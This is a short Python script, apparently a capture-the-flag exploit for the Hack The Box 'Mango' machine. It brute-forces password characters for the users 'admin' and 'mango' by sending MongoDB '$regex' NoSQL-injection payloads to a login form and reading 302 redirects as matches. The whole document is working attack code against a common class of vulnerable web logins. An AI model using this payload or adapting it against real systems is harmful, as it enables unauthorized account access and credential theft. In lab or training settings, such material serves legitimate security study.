from requests import post
from string import printable

url = 'http://staging-order.mango.htb/'

def sendPayload(user):
    valid = []
    for char in printable:
        regex = '{}.*'.format(char)
        data = {'username':user,'password[$regex]':regex, 'login':'login'}
        response = post(url, data =data, allow_redirects=False)
        if response.status_code == 302:
            valid.append(char)
    return valid

def getUser():
    for user in ['admin','mango']:
        valid = sendPayload(user)
        print "valid characters for {}: {}".format(user,valid)

if __name__ == '__main__':
    getUser()
